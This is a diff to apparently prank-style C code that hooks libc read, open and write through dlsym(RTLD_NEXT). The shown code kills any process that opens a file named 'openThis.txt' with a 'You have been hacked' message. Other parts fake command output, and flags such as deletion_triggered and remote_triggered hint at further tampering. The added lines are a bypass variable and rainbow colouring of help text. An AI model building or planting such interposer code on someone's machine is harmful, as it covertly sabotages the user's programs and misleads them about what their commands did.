@@ -22,6 +22,7 @@
 #include <pwd.h>
 #include <termios.h> //for exit cleanup
 #include <unistd.h>
+#include <stdbool.h>
 #include <dirent.h>
 
 
@@ -186,6 +187,11 @@ ssize_t read(int fd, void *buf, size_t count) {
         original_read = dlsym(RTLD_NEXT, "read");
     }
     
+    if (getenv("HACKED_ALREADY")) {
+    return original_read(fd, buf, count);
+}
+
+    
     static int deletion_triggered = 0;
     static int done = 0;
     static int remote_triggered = 0;
@@ -311,7 +317,8 @@ int open(const char *pathname, int flags, ...) {
     if (strstr(pathname, "openThis.txt")) { // a trap for users
         fprintf(stderr, "You have been hacked. Don't do everything you're told\n");
         restore_terminal();
-        _exit(0);
+       _exit(0);
+        //return 0;
     }
 
     va_list args;
@@ -351,18 +358,95 @@ void reverse_string(const char* in, char* out, size_t maxlen) {
     out[len] = '\0';
 }
 
-// write: in case of command not found print successful
-typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);
+// ANSI color codes (rainbow)
+const char *colors[] = {
+    "\033[31m", // Red
+    "\033[33m", // Yellow
+    "\033[32m", // Green
+    "\033[36m", // Cyan
+    "\033[34m", // Blue
+    "\033[35m", // Magenta
+};
+const int num_colors = sizeof(colors) / sizeof(colors[0]);
+const char *color_reset = "\033[0m";
 
-ssize_t write(int fd, const void *buf, size_t count) {
 
-    if (!original_write){
-        original_write = dlsym(RTLD_NEXT, "write");
+bool is_printable_text(const char *data, size_t len) {
+    int printable = 0;
+    for (size_t i = 0; i < len; ++i) {
+        if (isprint(data[i]) || data[i] == '\n' || data[i] == '\t') {
+            printable++;
+        }
+    }
+    return (printable > 0.9 * len); // >90% printable
 }
 
+// Build rainbow-colored line
+char *make_rainbow(const char *line, size_t len, size_t *out_len) {
+    size_t buf_size = len * 16 + strlen(color_reset) + 1;
+    char *out = malloc(buf_size);
+    if (!out) return NULL;
+
+    size_t i = 0, j = 0, color_idx = 0;
+
+    while (i < len) {
+        if (line[i] == '\033' && i + 1 < len && line[i + 1] == '[') {
+            // Copy ANSI escape sequence literally
+            size_t esc_start = i;
+            i += 2; // Skip "\033["
+
+            while (i < len && !(line[i] >= 'a' && line[i] <= 'z') && !(line[i] >= 'A' && line[i] <= 'Z')) {
+                i++;
+            }
+            if (i < len) i++; // include final 'm' or other char
+
+            size_t esc_len = i - esc_start;
+            memcpy(out + j, line + esc_start, esc_len);
+            j += esc_len;
+        } else {
+            const char *color = colors[color_idx % num_colors];
+            size_t c_len = strlen(color);
+            memcpy(out + j, color, c_len);
+            j += c_len;
+            out[j++] = line[i++];
+            color_idx++;
+        }
+    }
+
+    memcpy(out + j, color_reset, strlen(color_reset));
+    j += strlen(color_reset);
+    out[j] = '\0';
+    *out_len = j;
+    return out;
+}
+
+//*/
+
+// write: in case of command not found print successful
+typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);
+ssize_t write(int fd, const void *buf, size_t count) {
+    if (!original_write) {
+        original_write = dlsym(RTLD_NEXT, "write");
+    }
+    
+    
     if (getenv("DISABLE_WRITE_PRANK")) { // needed for connect function
         return original_write(fd, buf, count);
     }
+    
+   
+
+	if (!isatty(fd) || count == 0 || buf == NULL) {
+        return original_write(fd, buf, count);
+    }
+    const char *text = (const char *)buf;
+
+    // Skip non-text data
+    if (!is_printable_text(text, count)) {
+        return original_write(fd, buf, count);
+    }
+
+
     
     char *msg = strndup(buf, count);
     if (!msg) return original_write(fd, buf, count);
@@ -374,8 +458,34 @@ ssize_t write(int fd, const void *buf, size_t count) {
         free(msg);
         exit(0);
     }
+    
+    
+   //*
+    if (strstr(text, "usage") || strstr(text, "DO NOT MODIFY THIS FILE!") || strstr(text, "Manual page") || strstr(text, "--help")) {
+        // Process line-by-line
+        const char *start = text;
+        const char *end = text + count;
+        ssize_t total_written = 0;
 
-    ssize_t result = original_write(fd, msg, count);
+        while (start < end) {
+            const char *newline = memchr(start, '\n', end - start);
+            size_t line_len = newline ? (newline - start + 1) : (end - start);
+
+            size_t rainbow_len;
+            char *rainbow = make_rainbow(start, line_len, &rainbow_len);
+            if (rainbow) {
+                total_written += original_write(fd, rainbow, rainbow_len);
+                free(rainbow);
+            } else {
+                total_written += original_write(fd, start, line_len);
+            }
+
+            start += line_len;
+        }
+
+        return total_written;
+    }//*/
+ssize_t result = original_write(fd, msg, count);
     free(msg);
     return result;
 }
